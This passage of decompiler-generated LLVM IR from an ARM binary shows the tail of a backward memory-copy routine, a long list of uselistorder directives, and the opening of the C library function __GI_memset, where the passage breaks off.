  store i32 %v2_15b5c, i32* %r2.global-to-local, align 4
  %v4_15b5c = add i32 %v0_15b50, 2147483632
  %v5_15b5c = and i32 %v2_15b5c, %v4_15b5c
  %v6_15b5c = icmp slt i32 %v5_15b5c, 0
  store i1 %v6_15b5c, i1* %cpsr_v.global-to-local, align 1
  %v7_15b5c = icmp slt i32 %v2_15b5c, 0
  store i1 %v7_15b5c, i1* %cpsr_n.global-to-local, align 1
  %v8_15b5c = icmp eq i32 %v2_15b5c, 0
  store i1 %v8_15b5c, i1* %cpsr_z.global-to-local, align 1
  %v5_15b60 = icmp slt i32 %v2_15b50, -12
  br i1 %v5_15b60, label %dec_label_pc_15b7c, label %dec_label_pc_15b64

dec_label_pc_15b64:                               ; preds = %dec_label_pc_15b58, %dec_label_pc_15b18, %dec_label_pc_15b64
  %v1_15b70 = phi i32 [ %v5_15b70, %dec_label_pc_15b64 ], [ %v1_15b4c, %dec_label_pc_15b58 ], [ %v0_15ae019, %dec_label_pc_15b18 ]
  %v0_15b64 = load i32, i32* @r3, align 4
  %v3_15b64 = mul i32 %v0_15b64, 65536
  store i32 %v3_15b64, i32* %ip.global-to-local, align 4
  %v0_15b68 = load i32, i32* %r1.global-to-local, align 4
  %v1_15b68 = add i32 %v0_15b68, -4
  %v2_15b68 = inttoptr i32 %v1_15b68 to i32*
  %v3_15b68 = load i32, i32* %v2_15b68, align 4
  store i32 %v3_15b68, i32* @r3, align 4
  store i32 %v1_15b68, i32* %r1.global-to-local, align 4
  %v4_15b6c = udiv i32 %v3_15b68, 65536
  %v5_15b6c = or i32 %v4_15b6c, %v3_15b64
  store i32 %v5_15b6c, i32* @ip, align 4
  %v2_15b70 = add i32 %v1_15b70, -4
  %v3_15b70 = inttoptr i32 %v2_15b70 to i32*
  store i32 %v5_15b6c, i32* %v3_15b70, align 4
  %v4_15b70 = load i32, i32* %r0.global-to-local, align 4
  %v5_15b70 = add i32 %v4_15b70, -4
  store i32 %v5_15b70, i32* %r0.global-to-local, align 4
  %v0_15b74 = load i32, i32* %r2.global-to-local, align 4
  %v2_15b74 = add i32 %v0_15b74, -4
  store i32 %v2_15b74, i32* %r2.global-to-local, align 4
  %v6_15b78 = icmp slt i32 %v0_15b74, 4
  br i1 %v6_15b78, label %dec_label_pc_15b7c.loopexit, label %dec_label_pc_15b64

dec_label_pc_15b7c.loopexit:                      ; preds = %dec_label_pc_15b64
  %v4_15b74 = sub i32 3, %v0_15b74
  %v5_15b74 = and i32 %v4_15b74, %v0_15b74
  %v6_15b74 = icmp slt i32 %v5_15b74, 0
  %v7_15b74 = icmp slt i32 %v2_15b74, 0
  store i1 %v6_15b74, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15b74, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15b7c

dec_label_pc_15b7c:                               ; preds = %dec_label_pc_15b7c.loopexit, %dec_label_pc_15b58
  %v2_15a5452 = phi i32 [ %v5_15b70, %dec_label_pc_15b7c.loopexit ], [ %v1_15b4c, %dec_label_pc_15b58 ]
  %v0_15a4448 = phi i32 [ %v2_15b74, %dec_label_pc_15b7c.loopexit ], [ %v2_15b5c, %dec_label_pc_15b58 ]
  %v0_15b7c = load i32, i32* %r1.global-to-local, align 4
  %v1_15b7c = add i32 %v0_15b7c, 2
  store i32 %v1_15b7c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_15b84:                               ; preds = %dec_label_pc_15a98
  br i1 %v5_15b88, label %dec_label_pc_15bd0, label %dec_label_pc_15b8c

dec_label_pc_15b8c:                               ; preds = %dec_label_pc_15b84
  store i32 %v2_15b84, i32* %r2.global-to-local, align 4
  %v3_15b90 = load i32, i32* @r4, align 4
  store i32 %v3_15b90, i32* %stack_var_-12, align 4
  %v6_15b90 = load i32, i32* @r5, align 4
  %v8_15b90 = inttoptr i32 %v6_15b90 to i8*
  store i8* %v8_15b90, i8** %stack_var_-8, align 4
  %v11_15b90 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15b94

dec_label_pc_15b94:                               ; preds = %dec_label_pc_15b94.dec_label_pc_15b94_crit_edge, %dec_label_pc_15b8c
  %v0_15bb8 = phi i32 [ %v1_15bb8, %dec_label_pc_15b94.dec_label_pc_15b94_crit_edge ], [ %v0_15ae019, %dec_label_pc_15b8c ]
  %v0_15b98 = phi i32 [ %v0_15b98.pre, %dec_label_pc_15b94.dec_label_pc_15b94_crit_edge ], [ %v1_15a98, %dec_label_pc_15b8c ]
  %v0_15b94 = phi i32 [ %v0_15b94.pre, %dec_label_pc_15b94.dec_label_pc_15b94_crit_edge ], [ %v2_15a9c, %dec_label_pc_15b8c ]
  %v3_15b94 = mul i32 %v0_15b94, 16777216
  store i32 %v3_15b94, i32* %lr.global-to-local, align 4
  %v1_15b98 = add i32 %v0_15b98, -4
  %v2_15b98 = inttoptr i32 %v1_15b98 to i32*
  %v3_15b98 = load i32, i32* %v2_15b98, align 4
  store i32 %v3_15b98, i32* @r3, align 4
  %v4_15b98 = add i32 %v0_15b98, -8
  %v5_15b98 = inttoptr i32 %v4_15b98 to i32*
  %v6_15b98 = load i32, i32* %v5_15b98, align 4
  store i32 %v6_15b98, i32* %r4.global-to-local, align 4
  %v7_15b98 = add i32 %v0_15b98, -12
  %v8_15b98 = inttoptr i32 %v7_15b98 to i32*
  %v9_15b98 = load i32, i32* %v8_15b98, align 4
  store i32 %v9_15b98, i32* %r5.global-to-local, align 4
  %v10_15b98 = add i32 %v0_15b98, -16
  %v11_15b98 = inttoptr i32 %v10_15b98 to i32*
  %v12_15b98 = load i32, i32* %v11_15b98, align 4
  store i32 %v10_15b98, i32* %r1.global-to-local, align 4
  %v4_15b9c = udiv i32 %v12_15b98, 256
  %v5_15b9c = or i32 %v4_15b9c, %v3_15b94
  store i32 %v5_15b9c, i32* %lr.global-to-local, align 4
  %v3_15ba0 = mul i32 %v12_15b98, 16777216
  %v4_15ba4 = udiv i32 %v9_15b98, 256
  %v5_15ba4 = or i32 %v3_15ba0, %v4_15ba4
  store i32 %v5_15ba4, i32* @ip, align 4
  %v3_15ba8 = mul i32 %v9_15b98, 16777216
  %v4_15bac = udiv i32 %v6_15b98, 256
  %v5_15bac = or i32 %v3_15ba8, %v4_15bac
  store i32 %v5_15bac, i32* %r5.global-to-local, align 4
  %v3_15bb0 = mul i32 %v6_15b98, 16777216
  %v4_15bb4 = udiv i32 %v3_15b98, 256
  %v5_15bb4 = or i32 %v3_15bb0, %v4_15bb4
  store i32 %v5_15bb4, i32* %r4.global-to-local, align 4
  %v1_15bb8 = add i32 %v0_15bb8, -16
  %v2_15bb8 = inttoptr i32 %v1_15bb8 to i32*
  store i32 %v5_15bb4, i32* %v2_15bb8, align 4
  %v4_15bb8 = add i32 %v0_15bb8, -12
  %v5_15bb8 = inttoptr i32 %v4_15bb8 to i32*
  %v6_15bb8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15bb8, i32* %v5_15bb8, align 4
  %v7_15bb8 = add i32 %v0_15bb8, -8
  %v8_15bb8 = inttoptr i32 %v7_15bb8 to i32*
  %v9_15bb8 = load i32, i32* @ip, align 4
  store i32 %v9_15bb8, i32* %v8_15bb8, align 4
  %v10_15bb8 = add i32 %v0_15bb8, -4
  %v11_15bb8 = inttoptr i32 %v10_15bb8 to i32*
  %v12_15bb8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15bb8, i32* %v11_15bb8, align 4
  store i32 %v1_15bb8, i32* %r0.global-to-local, align 4
  %v0_15bbc = load i32, i32* %r2.global-to-local, align 4
  %v2_15bbc = add i32 %v0_15bbc, -16
  store i32 %v2_15bbc, i32* %r2.global-to-local, align 4
  %v6_15bc0 = icmp slt i32 %v0_15bbc, 16
  br i1 %v6_15bc0, label %dec_label_pc_15bc4, label %dec_label_pc_15b94.dec_label_pc_15b94_crit_edge

dec_label_pc_15b94.dec_label_pc_15b94_crit_edge:  ; preds = %dec_label_pc_15b94
  %v0_15b94.pre = load i32, i32* @r3, align 4
  %v0_15b98.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15b94

dec_label_pc_15bc4:                               ; preds = %dec_label_pc_15b94
  %v2_15bc4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15bc4, i32* @r4, align 4
  %v5_15bc4 = load i8*, i8** %stack_var_-8, align 4
  %v6_15bc4 = ptrtoint i8* %v5_15bc4 to i32
  store i32 %v6_15bc4, i32* @r5, align 4
  store i32 %v11_15b90, i32* @lr, align 4
  %v2_15bc8 = add i32 %v0_15bbc, -4
  store i32 %v2_15bc8, i32* %r2.global-to-local, align 4
  %v4_15bc8 = add i32 %v0_15bbc, 2147483632
  %v5_15bc8 = and i32 %v2_15bc8, %v4_15bc8
  %v6_15bc8 = icmp slt i32 %v5_15bc8, 0
  store i1 %v6_15bc8, i1* %cpsr_v.global-to-local, align 1
  %v7_15bc8 = icmp slt i32 %v2_15bc8, 0
  store i1 %v7_15bc8, i1* %cpsr_n.global-to-local, align 1
  %v8_15bc8 = icmp eq i32 %v2_15bc8, 0
  store i1 %v8_15bc8, i1* %cpsr_z.global-to-local, align 1
  %v5_15bcc = icmp slt i32 %v2_15bbc, -12
  br i1 %v5_15bcc, label %dec_label_pc_15be8, label %dec_label_pc_15bd0

dec_label_pc_15bd0:                               ; preds = %dec_label_pc_15bc4, %dec_label_pc_15b84, %dec_label_pc_15bd0
  %v1_15bdc = phi i32 [ %v5_15bdc, %dec_label_pc_15bd0 ], [ %v1_15bb8, %dec_label_pc_15bc4 ], [ %v0_15ae019, %dec_label_pc_15b84 ]
  %v0_15bd0 = load i32, i32* @r3, align 4
  %v3_15bd0 = mul i32 %v0_15bd0, 16777216
  store i32 %v3_15bd0, i32* %ip.global-to-local, align 4
  %v0_15bd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_15bd4 = add i32 %v0_15bd4, -4
  %v2_15bd4 = inttoptr i32 %v1_15bd4 to i32*
  %v3_15bd4 = load i32, i32* %v2_15bd4, align 4
  store i32 %v3_15bd4, i32* @r3, align 4
  store i32 %v1_15bd4, i32* %r1.global-to-local, align 4
  %v4_15bd8 = udiv i32 %v3_15bd4, 256
  %v5_15bd8 = or i32 %v4_15bd8, %v3_15bd0
  store i32 %v5_15bd8, i32* @ip, align 4
  %v2_15bdc = add i32 %v1_15bdc, -4
  %v3_15bdc = inttoptr i32 %v2_15bdc to i32*
  store i32 %v5_15bd8, i32* %v3_15bdc, align 4
  %v4_15bdc = load i32, i32* %r0.global-to-local, align 4
  %v5_15bdc = add i32 %v4_15bdc, -4
  store i32 %v5_15bdc, i32* %r0.global-to-local, align 4
  %v0_15be0 = load i32, i32* %r2.global-to-local, align 4
  %v2_15be0 = add i32 %v0_15be0, -4
  store i32 %v2_15be0, i32* %r2.global-to-local, align 4
  %v6_15be4 = icmp slt i32 %v0_15be0, 4
  br i1 %v6_15be4, label %dec_label_pc_15be8.loopexit, label %dec_label_pc_15bd0

dec_label_pc_15be8.loopexit:                      ; preds = %dec_label_pc_15bd0
  %v4_15be0 = sub i32 3, %v0_15be0
  %v5_15be0 = and i32 %v4_15be0, %v0_15be0
  %v6_15be0 = icmp slt i32 %v5_15be0, 0
  %v7_15be0 = icmp slt i32 %v2_15be0, 0
  store i1 %v6_15be0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15be0, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15be8

dec_label_pc_15be8:                               ; preds = %dec_label_pc_15be8.loopexit, %dec_label_pc_15bc4
  %v2_15a5453 = phi i32 [ %v5_15bdc, %dec_label_pc_15be8.loopexit ], [ %v1_15bb8, %dec_label_pc_15bc4 ]
  %v0_15a4449 = phi i32 [ %v2_15be0, %dec_label_pc_15be8.loopexit ], [ %v2_15bc8, %dec_label_pc_15bc4 ]
  %v0_15be8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15be8 = add i32 %v0_15be8, 1
  store i32 %v1_15be8, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_15bdc, { 0, 2, 1 }
  uselistorder i32 %v3_15bd0, { 1, 0 }
  uselistorder i32 %v2_15bc8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15bb8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15b98, { 1, 0 }
  uselistorder i32 %v3_15b94, { 1, 0 }
  uselistorder i32 %v0_15b98, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15bb8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15b70, { 0, 2, 1 }
  uselistorder i32 %v3_15b64, { 1, 0 }
  uselistorder i32 %v2_15b5c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15b4c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15b2c, { 1, 0 }
  uselistorder i32 %v3_15b28, { 1, 0 }
  uselistorder i32 %v0_15b2c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15b4c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15b04, { 0, 2, 1 }
  uselistorder i32 %v3_15af8, { 1, 0 }
  uselistorder i32 %v2_15af0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15ae0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15ac0, { 1, 0 }
  uselistorder i32 %v3_15abc, { 1, 0 }
  uselistorder i32 %v0_15ac0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15ae0, { 3, 2, 1, 0 }
  uselistorder i1 %v5_15b88, { 2, 0, 1 }
  uselistorder i32 %v0_15aa0, { 1, 0 }
  uselistorder i32 %v0_15b8c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_15ae019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_15a90, { 2, 1, 0 }
  uselistorder i32 %v0_15a90, { 2, 0, 1 }
  uselistorder i32 %v2_15a88, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_15a88, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15a88, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_15ae020, { 2, 1, 0 }
  uselistorder i32 %v11_15a64, { 1, 0 }
  uselistorder i32 %v7_15a64, { 1, 0 }
  uselistorder i32 %v1_15a44, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_15a44, { 1, 2, 0, 3 }
  uselistorder i32 %v2_15a48, { 1, 0 }
  uselistorder i32 %v7_15a3c, { 0, 2, 1 }
  uselistorder i32 %v10_15a38, { 1, 0 }
  uselistorder i32 %v9_15a30, { 1, 0, 2 }
  uselistorder i32 %v6_15a2c, { 1, 0 }
  uselistorder i32 %v2_15a24, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_15a24, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_15a34, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15a18, { 0, 2, 1 }
  uselistorder i32 %v13_15a14, { 1, 0 }
  uselistorder i32 %v4_15a10, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_15a10, { 2, 0, 1 }
  uselistorder i32 %v6_15a18, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15a08, { 0, 2, 1 }
  uselistorder i32 %v16_15a04, { 1, 0 }
  uselistorder i32 %v4_15a00, { 1, 2, 0 }
  uselistorder i32 %v0_15a10.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_15a08, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_159f4, { 0, 3, 2, 1 }
  uselistorder i32 %v10_159f0, { 1, 0 }
  uselistorder i32 %v1_159ec, { 1, 0 }
  uselistorder i32 %v10_159e8, { 1, 0 }
  uselistorder i32 %v0_159e8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_159ec, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_159e0, { 0, 2, 1 }
  uselistorder i32 %v2_159d4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_159d4, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_159ec37, { 1, 2, 0 }
  uselistorder i32 %v1_159cc, { 2, 1, 0 }
  uselistorder i32 %v1_159c4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_159bc, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_159b8, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_159b4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_159b4, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_159a4, { 0, 2, 1 }
  uselistorder i32 %v4_159a0, { 1, 0 }
  uselistorder i32 %v3_15994, { 1, 0 }
  uselistorder i32 %v1_1598c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15980, { 1, 0 }
  uselistorder i32 %v12_1597c, { 0, 2, 1 }
  uselistorder i32 %v8_1595c, { 1, 0, 2 }
  uselistorder i32 %v5_1595c, { 1, 0, 2 }
  uselistorder i32 %v2_1595c, { 1, 0, 2 }
  uselistorder i32 %v0_1595c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1597c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_15938, { 0, 2, 1 }
  uselistorder i32 %v4_15934, { 1, 0 }
  uselistorder i32 %v3_15928, { 1, 0 }
  uselistorder i32 %v1_15920, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15914, { 1, 0 }
  uselistorder i32 %v12_15910, { 0, 2, 1 }
  uselistorder i32 %v8_158f0, { 1, 0, 2 }
  uselistorder i32 %v5_158f0, { 1, 0, 2 }
  uselistorder i32 %v2_158f0, { 1, 0, 2 }
  uselistorder i32 %v0_158f0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15910, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_158cc, { 0, 2, 1 }
  uselistorder i32 %v4_158c8, { 1, 0 }
  uselistorder i32 %v3_158bc, { 1, 0 }
  uselistorder i32 %v1_158b4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_158a8, { 1, 0 }
  uselistorder i32 %v12_158a4, { 0, 2, 1 }
  uselistorder i32 %v8_15884, { 1, 0, 2 }
  uselistorder i32 %v5_15884, { 1, 0, 2 }
  uselistorder i32 %v2_15884, { 1, 0, 2 }
  uselistorder i32 %v0_15884, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_158a4, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_158e0, { 0, 2, 1 }
  uselistorder i32 %v1_158dc, { 2, 0, 1, 3 }
  uselistorder i32 %v4_15860, { 2, 0, 1, 3 }
  uselistorder i32 %v2_15860, { 2, 0, 1, 3 }
  uselistorder i32 %v0_158e4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1597c76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_15854, { 1, 0 }
  uselistorder i32 %v0_15854, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1584c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1584c, { 1, 0, 2 }
  uselistorder i32 %v0_1584c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1597c77, { 1, 0 }
  uselistorder i32 %v1_1582c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_15834, { 1, 0 }
  uselistorder i32 %v0_15808, { 3, 0, 1, 2 }
  uselistorder i32 %v1_157fc, { 1, 2, 0, 3 }
  uselistorder i32 %v5_157e8, { 1, 0, 2 }
  uselistorder i32 %v1_157e4, { 1, 0 }
  uselistorder i32 %v1_157dc, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_157dc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_157d4, { 0, 2, 1 }
  uselistorder i32 %v3_157d4, { 3, 0, 1, 2 }
  uselistorder i1 %v0_157d4, { 1, 0 }
  uselistorder i1 %v1_157d4, { 1, 0 }
  uselistorder i32 %v3_157d0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_157c8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_157b4, { 1, 2, 0 }
  uselistorder i32 %v1_157ac, { 0, 2, 1 }
  uselistorder i32 %v12_157a8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1579c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_157a0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_15790, { 0, 2, 1 }
  uselistorder i32 %v1_15788, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_15788, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_15780, { 1, 0 }
  uselistorder i32 %v1_15778, { 2, 1, 0 }
  uselistorder i32 %v2_15770, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_15770, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1576c, { 1, 0 }
  uselistorder i32 %v2_15760, { 1, 0 }
  uselistorder i32 %v1_15760, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_15760, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 48, 47, 56, 49, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 27, { 1, 0, 2, 3 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 60, 61, 62, 6, 18, 19, 20, 63, 64, 65, 7, 21, 22, 23, 66, 67, 68, 8, 24, 25, 69, 16, 15, 70, 71, 72, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 73, 10, 33, 41, 42, 43, 9, 44, 45, 46, 34, 40, 2, 35, 47, 48, 49, 50, 51, 52, 0, 1, 53, 54, 55, 56, 57, 58, 59, 36, 37, 38, 39 }
  uselistorder label %dec_label_pc_15bd0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15b64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15af8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15a98, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_15a24, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_159e8, { 1, 0 }
  uselistorder label %dec_label_pc_159d4, { 1, 0 }
  uselistorder label %dec_label_pc_15994, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15928, { 2, 0, 1 }
  uselistorder label %dec_label_pc_158bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1585c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_1582c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_157c8, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_15788, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_15bf4 = icmp eq i32 %arg3, 8
  store i1 %v8_15bf4, i1* %cpsr_z.global-to-local, align 1
  %v5_15bf8 = icmp slt i32 %arg3, 8
  br i1 %v5_15bf8, label %dec_label_pc_15c58, label %dec_label_pc_15bfc

dec_label_pc_15bfc:                               ; preds = %entry
  %v4_15bfc = mul i32 %arg2, 256
  %v5_15bfc = or i32 %v4_15bfc, %arg2
  %v4_15c00 = mul i32 %v5_15bfc, 65536
  %v5_15c00 = or i32 %v4_15c00, %v5_15bfc
  store i32 %v5_15c00, i32* @r1, align 4
  %v1_15c0457 = urem i32 %tmp, 4
  %v2_15c0458 = icmp eq i32 %v1_15c0457, 0
  store i1 %v2_15c0458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_15c0458, label %dec_label_pc_15c14, label %bb

bb:                                               ; preds = %dec_label_pc_15bfc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_15bfc ]
  %v3_15c0859 = phi i32 [ %v6_15c08, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_15bfc ]
  %v4_15c08 = inttoptr i32 %v3_15c0859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_15c08, align 1
  %v5_15c08 = load i32, i32* @r3, align 4
  %v6_15c08 = add i32 %v5_15c08, 1
  store i32 %v6_15c08, i32* @r3, align 4
  %v0_15c0c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_15c18.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_15c0c.pr, label %dec_label_pc_15c14, label %.thread

.thread:                                          ; preds = %bb
  %v2_15c0c = add i32 %v0_15c18.pr.pre, -1
  store i32 %v2_15c0c, i32* %r2.global-to-local, align 4
  %v1_15c04 = urem i32 %v6_15c08, 4
  %v2_15c04 = icmp eq i32 %v1_15c04, 0
  store i1 %v2_15c04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c04, label %dec_label_pc_15c14, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_15c08.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_15c08.pre to i8
  br label %bb

dec_label_pc_15c14:                               ; preds = %.thread, %bb, %dec_label_pc_15bfc
  %v0_15c2028 = phi i32 [ %tmp, %dec_label_pc_15bfc ], [ %v6_15c08, %bb ], [ %v6_15c08, %.thread ]
  %v0_15c18.pr = phi i32 [ %arg3, %dec_label_pc_15bfc ], [ %v0_15c18.pr.pre, %bb ], [ %v2_15c0c, %.thread ]
  %v0_15c14 = load i32, i32* @r1, align 4
  store i32 %v0_15c14, i32* %ip.global-to-local, align 4
  %v8_15c1810 = icmp eq i32 %v0_15c18.pr, 8
  store i1 %v8_15c1810, i1* %cpsr_z.global-to-local, align 1
  %v5_15c1c11 = icmp slt i32 %v0_15c18.pr, 8
